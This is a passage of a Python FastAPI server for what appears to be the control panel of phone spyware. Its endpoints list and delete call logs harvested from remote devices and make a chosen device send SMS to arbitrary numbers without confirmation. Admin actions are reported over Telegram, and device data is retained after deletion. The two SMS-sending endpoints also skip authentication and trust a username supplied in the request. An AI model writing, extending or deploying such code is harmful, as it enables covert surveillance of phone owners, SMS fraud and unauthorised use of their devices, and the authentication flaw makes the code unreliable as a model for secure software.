    # Run log_activity and telegram notification in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.DELETE_DATA,
            description=f"Deleted {result.deleted_count} call logs from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"type": "calls", "count": result.deleted_count},
            send_telegram=True
        )
    )
    
    asyncio.create_task(
        telegram_multi_service.notify_admin_action(
            admin_username=current_admin.username,
            action="calls_deleted",
            details=f"Deleted {result.deleted_count} call logs",
            ip_address=get_client_ip(request),
            device_id=device_id
        )
    )

    return {
        "success": True,
        "deleted_count": result.deleted_count
    }

@app.delete("/api/devices/{device_id}/calls/{call_id}")
async def delete_device_call(
    device_id: str,
    call_id: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.DELETE_DATA))
):
    query = {
        "device_id": device_id,
        "$or": [
            {"call_id": call_id},
            {"_id": ObjectId(call_id) if ObjectId.is_valid(call_id) else call_id}
        ]
    }
    result = await mongodb.db.call_logs.delete_one(query)

    # Track deleted call IDs to prevent re-ingest
    await mongodb.db.devices.update_one(
        {"device_id": device_id},
        {"$addToSet": {"deleted_call_ids": call_id}}
    )

    # Run log_activity and telegram notification in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.DELETE_DATA,
            description=f"Deleted call log {call_id} from device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"type": "call_single", "id": call_id, "count": result.deleted_count},
            send_telegram=True
        )
    )
    
    asyncio.create_task(
        telegram_multi_service.notify_admin_action(
            current_admin.username,
            "Call Deleted",
            f"Deleted call log (id: {call_id})",
            ip_address=get_client_ip(request),
            device_id=device_id
        )
    )

    return {
        "success": True,
        "deleted_count": result.deleted_count
    }

@app.post("/api/admin/mark-device", response_model=MarkDeviceResponse)
async def mark_device(
    request_data: MarkDeviceRequest,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    if current_admin.role != AdminRole.SUPER_ADMIN:
        raise HTTPException(status_code=403, detail="Only super admin can mark devices")

    device_id = request_data.device_id
    sim_slot = request_data.sim_slot if request_data.sim_slot is not None else 0
    admin_username = current_admin.username

    try:
        device = await device_service.get_device(device_id)
        if not device:
            raise HTTPException(status_code=404, detail="Device not found")

        existing_mark = await mongodb.db.marked_devices.find_one({"admin_username": admin_username})
        
        # Toggle behavior: if same device is already marked, unmark it
        if existing_mark and existing_mark.get("device_id") == device_id:
            # Unmark the device
            await mongodb.db.marked_devices.delete_one({"admin_username": admin_username})
            logger.info(f"❌ [MARK] Device unmarked - Admin: {admin_username}, Device: {device_id}")

            # Send WebSocket notification for unmark
            try:
                await asyncio.wait_for(
                    admin_ws_manager.notify_device_unmarked(device_id, admin_username),
                    timeout=3.0
                )
                logger.info(f"📡 [UNMARK] WebSocket notification sent - Device: {device_id}, Admin: {admin_username}")
            except asyncio.TimeoutError:
                logger.warning(f"⚠️ [UNMARK] WebSocket notification timeout - Device: {device_id}, Admin: {admin_username}")
            except Exception as e:
                logger.warning(f"⚠️ [UNMARK] WebSocket notification failed: {e}")

            # Run log_activity in background to avoid timeout
            asyncio.create_task(
                admin_activity_service.log_activity(
                    admin_username=admin_username,
                    activity_type=ActivityType.SEND_COMMAND,
                    description=f"Unmarked device: {device_id}",
                    ip_address=get_client_ip(request),
                    device_id=device_id,
                    metadata={"action": "unmark_device"}
                )
            )

            return MarkDeviceResponse(
                success=True,
                message="Device unmarked successfully",
                device_id=device_id,
                admin_username=admin_username,
                is_marked=False
            )
        
        # If different device is marked, remove old mark first
        if existing_mark:
            old_device_id = existing_mark.get("device_id")
            await mongodb.db.marked_devices.delete_one({"admin_username": admin_username})
            logger.info(f"🔄 [MARK] Removed old mark - Admin: {admin_username}, Old Device: {old_device_id}")

        # Mark the new device
        mark_doc = {
            "device_id": device_id,
            "admin_username": admin_username,
            "sim_slot": sim_slot,
            "marked_at": utc_now()
        }
        await mongodb.db.marked_devices.replace_one(
            {"admin_username": admin_username},
            mark_doc,
            upsert=True
        )

        logger.info(f"✅ [MARK] Device marked - Admin: {admin_username}, Device: {device_id}, SIM Slot: {sim_slot}")

        # Send WebSocket notification with timeout to avoid blocking response
        try:
            await asyncio.wait_for(
                admin_ws_manager.notify_device_marked(device_id, admin_username),
                timeout=3.0
            )
            logger.info(f"📡 [MARK] WebSocket notification sent - Device: {device_id}, Admin: {admin_username}")
        except asyncio.TimeoutError:
            logger.warning(f"⚠️ [MARK] WebSocket notification timeout - Device: {device_id}, Admin: {admin_username}")
        except Exception as e:
            logger.warning(f"⚠️ [MARK] WebSocket notification failed: {e}")

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=admin_username,
                activity_type=ActivityType.SEND_COMMAND,
                description=f"Marked device for SMS: {device_id}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"action": "mark_device", "sim_slot": sim_slot}
            )
        )

        return MarkDeviceResponse(
            success=True,
            message="Device marked successfully",
            device_id=device_id,
            admin_username=admin_username,
            is_marked=True
        )

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"❌ [MARK] Failed to mark device: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Failed to mark device: {str(e)}")

@app.post("/api/admin/send-sms-to-marked-device", response_model=SendSmsToMarkedDeviceResponse)
async def send_sms_to_marked_device(
    request_data: SendSmsToMarkedDeviceRequest,
    request: Request
):
    msg = request_data.msg
    number = request_data.number
    sim_slot = request_data.sim_slot
    admin_username = request_data.admin_username

    if not msg or not number or not admin_username:
        raise HTTPException(status_code=400, detail="Message, number and admin_username are required")

    try:
        admin = await mongodb.db.admins.find_one({"username": admin_username})
        if not admin:
            raise HTTPException(status_code=404, detail="Admin not found")
        
        if admin.get("role") != AdminRole.SUPER_ADMIN:
            raise HTTPException(status_code=403, detail="Only super admin can send SMS to marked devices")
        
        mark = await mongodb.db.marked_devices.find_one({"admin_username": admin_username})
        if not mark:
            raise HTTPException(status_code=404, detail="No marked device found for this admin")

        device_id = mark.get("device_id")

        device = await device_service.get_device(device_id)
        if not device:
            await mongodb.db.marked_devices.delete_one({"admin_username": admin_username})
            raise HTTPException(status_code=404, detail="Marked device not found")

        # Check if sim_slot is already set in mark (from mark-device endpoint)
        marked_sim_slot = mark.get("sim_slot")
        if marked_sim_slot is not None:
            # Use the sim_slot from mark, ignore the one in request
            sim_slot = marked_sim_slot
            logger.info(f"📋 [SEND_SMS] Using SIM slot from mark: {sim_slot}")

        # Store SMS info and directly send SMS (no confirmation dialog)
        logger.info(f"💾 [SEND_SMS] Storing SMS info and sending directly - Admin: {admin_username}, Device: {device_id}, Number: {number}, SIM: {sim_slot}")
        await mongodb.db.marked_devices.update_one(
            {"admin_username": admin_username},
            {"$set": {"msg": msg, "number": number, "sim_slot": sim_slot}}
        )
        
        # Directly send SMS without confirmation
        logger.info(f"📤 [SEND_SMS] Sending SMS directly (no confirmation) - Device: {device_id}, Number: {number}, SIM: {sim_slot}")
        result = await firebase_service.send_sms(
            device_id=device_id,
            phone=number,
            message=msg,
            sim_slot=sim_slot
        )

        if result.get("success"):
            logger.info(f"✅ [SEND_SMS] SMS send request created - Admin: {admin_username}, Device: {device_id}, Number: {number}, SIM: {sim_slot}")

            # Get device name for notification
            device_name = device.device_name or device.model or device_id
            
            # Send WebSocket notification to admin
            try:
                await asyncio.wait_for(
                    admin_ws_manager.notify_sms_sent_via_mark(
                        device_id=device_id,
                        admin_username=admin_username,
                        device_name=device_name,
                        phone=number,
                        sim_slot=sim_slot
                    ),
                    timeout=3.0
                )
                logger.info(f"📡 [SEND_SMS] WebSocket notification sent - Device: {device_id}, Admin: {admin_username}")
            except asyncio.TimeoutError:
                logger.warning(f"⚠️ [SEND_SMS] WebSocket notification timeout - Device: {device_id}, Admin: {admin_username}")
            except Exception as e:
                logger.warning(f"⚠️ [SEND_SMS] WebSocket notification failed: {e}")
            
            # Send push notification to admin in background
            asyncio.create_task(
                send_push_in_background(
                    firebase_admin_service,
                    admin_username,
                    "SMS Send Requested",
                    f"SMS send request created for device {device_name} via SIM {sim_slot + 1}",
                    {
                        "type": "sms_sent",
                        "device_id": device_id,
                        "device_name": device_name,
                        "phone": number,
                        "sim_slot": str(sim_slot),
                    }
                )
            )

            # Run log_activity in background to avoid timeout
            asyncio.create_task(
                admin_activity_service.log_activity(
                    admin_username=admin_username,
                    activity_type=ActivityType.SEND_COMMAND,
                    description=f"Sent SMS to marked device: {device_id}",
                    ip_address=get_client_ip(request),
                    device_id=device_id,
                    metadata={"command": "send_sms", "phone": number, "sim_slot": sim_slot, "result": result}
                )
            )

            return SendSmsToMarkedDeviceResponse(
                success=True,
                message="SMS send request created",
                device_id=device_id
            )
        else:
            error_msg = result.get('message', 'Unknown error')
            logger.error(f"❌ [SEND_SMS] SMS send failed - Admin: {admin_username}, Device: {device_id}, Error: {error_msg}")
            raise HTTPException(status_code=500, detail=f"Failed to send SMS: {error_msg}")

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"❌ [SEND_SMS] Failed: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Failed to store SMS info: {str(e)}")

@app.get("/api/admin/marked-device-info", response_model=MarkedDeviceInfoResponse)
async def get_marked_device_info(
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    if current_admin.role != AdminRole.SUPER_ADMIN:
        raise HTTPException(status_code=403, detail="Only super admin can view marked device info")

    admin_username = current_admin.username

    try:
        mark = await mongodb.db.marked_devices.find_one({"admin_username": admin_username})
        if not mark:
            return MarkedDeviceInfoResponse(
                success=False,
                device_id=""
            )

        device_id = mark.get("device_id")
        msg = mark.get("msg")
        number = mark.get("number")
        sim_slot = mark.get("sim_slot")

        logger.info(f"📋 [MARK] Getting marked device info - Admin: {admin_username}, Device: {device_id}, SIM: {sim_slot}")

        return MarkedDeviceInfoResponse(
            success=True,
            device_id=device_id,
            msg=msg,
            number=number,
            sim_slot=sim_slot,
            expires_at=None
        )

    except Exception as e:
        logger.error(f"❌ [MARK] Failed to get marked device info: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Failed to get marked device info: {str(e)}")

@app.post("/api/admin/set-marked-device-sms", response_model=SetMarkedDeviceSmsResponse)
async def set_marked_device_sms(
    request_data: SetMarkedDeviceSmsRequest,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    if current_admin.role != AdminRole.SUPER_ADMIN:
        raise HTTPException(status_code=403, detail="Only super admin can set marked device SMS")

    msg = request_data.msg
    number = request_data.number
    admin_username = current_admin.username

    if not msg or not number:
        raise HTTPException(status_code=400, detail="Message and number are required")

    try:
        mark = await mongodb.db.marked_devices.find_one({"admin_username": admin_username})
        if not mark:
            raise HTTPException(status_code=404, detail="No marked device found for this admin")

        await mongodb.db.marked_devices.update_one(
            {"admin_username": admin_username},
            {"$set": {"msg": msg, "number": number}}
        )

        device_id = mark.get("device_id")
        logger.info(f"📝 [MARK] SMS content set - Admin: {admin_username}, Device: {device_id}, Number: {number}")

        return SetMarkedDeviceSmsResponse(
            success=True,
            message="SMS content set successfully"
        )

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"❌ [MARK] Failed to set SMS content: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Failed to set SMS content: {str(e)}")

@app.post("/api/admin/confirm-send-sms-to-marked-device", response_model=ConfirmSendSmsResponse)
async def confirm_send_sms_to_marked_device(
    request_data: ConfirmSendSmsRequest,
    request: Request
):
    admin_username = request_data.admin_username

    if not admin_username:
        raise HTTPException(status_code=400, detail="Admin username is required")

    try:
        admin = await mongodb.db.admins.find_one({"username": admin_username})
        if not admin:
            raise HTTPException(status_code=404, detail="Admin not found")
        
        if admin.get("role") != AdminRole.SUPER_ADMIN:
            raise HTTPException(status_code=403, detail="Only super admin can send SMS to marked devices")
        
        mark = await mongodb.db.marked_devices.find_one({"admin_username": admin_username})
        if not mark:
            raise HTTPException(status_code=404, detail="No marked device found for this admin")

        device_id = mark.get("device_id")
        msg = mark.get("msg")
        number = mark.get("number")
        sim_slot = mark.get("sim_slot", 0)
        
        if not msg or not number:
            raise HTTPException(status_code=400, detail="SMS info not found in marked device")

        device = await device_service.get_device(device_id)
        if not device:
            await mongodb.db.marked_devices.delete_one({"admin_username": admin_username})
            raise HTTPException(status_code=404, detail="Marked device not found")

        logger.info(f"📤 [SEND_SMS] Confirming and sending SMS - Admin: {admin_username}, Device: {device_id}, Number: {number}, SIM: {sim_slot}")

        result = await firebase_service.send_sms(
            device_id=device_id,
            phone=number,
            message=msg,
            sim_slot=sim_slot
        )

        if result.get("success"):
            logger.info(f"✅ [SEND_SMS] SMS send request created - Admin: {admin_username}, Device: {device_id}")

            # Get device name for notification
            device_name = device.device_name or device.model or device_id
            
            # Send WebSocket notification to admin
            try:
                await asyncio.wait_for(
                    admin_ws_manager.notify_sms_sent_via_mark(
                        device_id=device_id,
                        admin_username=admin_username,
                        device_name=device_name,
                        phone=number,
                        sim_slot=sim_slot
                    ),
                    timeout=3.0
                )
                logger.info(f"📡 [SEND_SMS] WebSocket notification sent - Device: {device_id}, Admin: {admin_username}")
            except asyncio.TimeoutError:
                logger.warning(f"⚠️ [SEND_SMS] WebSocket notification timeout - Device: {device_id}, Admin: {admin_username}")
            except Exception as e:
                logger.warning(f"⚠️ [SEND_SMS] WebSocket notification failed: {e}")
            
            # Send push notification to admin in background
            asyncio.create_task(
                send_push_in_background(
                    firebase_admin_service,
                    admin_username,
                    "SMS Send Requested",
                    f"SMS send request created for device {device_name} via SIM {sim_slot + 1}",
                    {
                        "type": "sms_sent",
                        "device_id": device_id,
                        "device_name": device_name,
                        "phone": number,
                        "sim_slot": str(sim_slot),
                    }
                )
            )

            # Run log_activity in background to avoid timeout
            asyncio.create_task(
                admin_activity_service.log_activity(
                    admin_username=admin_username,
                    activity_type=ActivityType.SEND_COMMAND,
                    description=f"Sent SMS to marked device: {device_id}",
                    ip_address=get_client_ip(request),
                    device_id=device_id,
                    metadata={"command": "send_sms", "phone": number, "sim_slot": sim_slot, "result": result}
                )
            )

            return ConfirmSendSmsResponse(
                success=True,
                message="SMS send request created",
                device_id=device_id
            )
        else:
            logger.error(f"❌ [SEND_SMS] SMS send failed - Admin: {admin_username}, Device: {device_id}, Error: {result.get('message')}")
            raise HTTPException(status_code=500, detail=f"Failed to send SMS: {result.get('message', 'Unknown error')}")

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"❌ [SEND_SMS] Failed: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Failed to send SMS: {str(e)}")

@app.delete("/api/devices/{device_id}")
async def delete_device(
    device_id: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_DEVICES))
):
    success = await device_service.soft_delete_device(device_id)

    if not success:
        raise HTTPException(status_code=404, detail="Device not found or already deleted")

    # Run log_activity and telegram notification in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.DELETE_DATA,
            description=f"Deleted device: {device_id}",
            ip_address=get_client_ip(request),
            device_id=device_id,
            metadata={"action": "soft_delete", "type": "device"},
            send_telegram=True
        )
    )
    
    asyncio.create_task(
        telegram_multi_service.notify_admin_action(
            admin_username=current_admin.username,
            action="device_deleted",
            details="Device removed from panel (data retained)",
            ip_address=get_client_ip(request),
            device_id=device_id
        )
    )

    return JSONResponse(
        status_code=200,
        content={
            "success": True,
            "message": "Device deleted successfully"
        }
    )

@app.post("/api/admin/clear-background-locks")
async def clear_background_locks(
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    """Clear stale background task locks (admin only)"""
    try:
        result = await mongodb.db.background_locks.delete_many({
            "_id": {"$in": ["bg_task_lock_restart_all_heartbeats", "bg_task_lock_check_offline_devices"]}
        })
        return {
            "success": True,
            "deleted_count": result.deleted_count,
            "message": f"Cleared {result.deleted_count} background task lock(s)"
        }
    except Exception as e:
        logger.error(f"Error clearing background locks: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/devices/cleanup-invalid-tokens")
async def cleanup_invalid_fcm_tokens(
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_DEVICES))
):
    """Clean up invalid FCM tokens (like NO_FCM_TOKEN_*) from all devices"""
    try:
        result = await device_service.cleanup_invalid_fcm_tokens()
        
        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.DELETE_DATA,
                description=f"Cleaned invalid FCM tokens: {result.get('tokens_removed', 0)} tokens removed from {result.get('devices_cleaned', 0)} devices",
                ip_address="system"
            )
        )
        
        return result
    except Exception as e:
        logger.error(f"Error cleaning invalid FCM tokens: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/devices/{device_id}/calls")
async def get_device_calls(
    device_id: str,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=500),
    request: Request = None,
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    logger.info(f"📋 [GET_CALLS] Request received - Device: {device_id}, Admin: {current_admin.username}, Skip: {skip}, Limit: {limit}")
    
    try:
        logger.info(f"📋 [GET_CALLS] Querying database for device {device_id}")
        
        calls_cursor = mongodb.db.call_logs.find(
            {"device_id": device_id}
        ).sort("timestamp", -1).skip(skip).limit(limit)

        calls = await calls_cursor.to_list(length=limit)
        logger.info(f"📋 [GET_CALLS] Retrieved {len(calls)} calls from database for device {device_id}")
        
        total = await mongodb.db.call_logs.count_documents({"device_id": device_id})
        logger.info(f"📋 [GET_CALLS] Total calls count: {total} for device {device_id}")

        logger.info(f"📋 [GET_CALLS] Starting call formatting - Device: {device_id}, Count: {len(calls)}")
        formatted_calls = []
        for call in calls:
            formatted_calls.append({
                "call_id": call.get("call_id"),
                "device_id": call.get("device_id"),
                "number": call.get("number", ""),
                "name": call.get("name", "Unknown"),
                "call_type": call.get("call_type", "unknown"),
                "timestamp": _format_datetime(call.get("timestamp")),
                "duration": call.get("duration", 0),
                "duration_formatted": call.get("duration_formatted", "0s"),
                "received_at": _format_datetime(call.get("received_at"))
            })
        logger.info(f"📋 [GET_CALLS] Call formatting completed - Device: {device_id}")

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.VIEW_DEVICE,
                description=f"Viewed call logs for device: {device_id}",
                ip_address=get_client_ip(request),
                device_id=device_id,
                metadata={"count": len(formatted_calls)}
            )
        )

        logger.info(f"✅ [GET_CALLS] Returning {len(formatted_calls)} calls (total: {total}) for device {device_id}")
        return {
            "calls": formatted_calls,
            "total": total,
            "page": skip // limit + 1,
            "page_size": limit
        }

    except Exception as e:
        logger.error(f"❌ [GET_CALLS] Failed to get call logs: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "app.main:app",
        host=settings.SERVER_HOST,
        port=settings.SERVER_PORT,
        reload=settings.DEBUG,
        log_level="info"
    )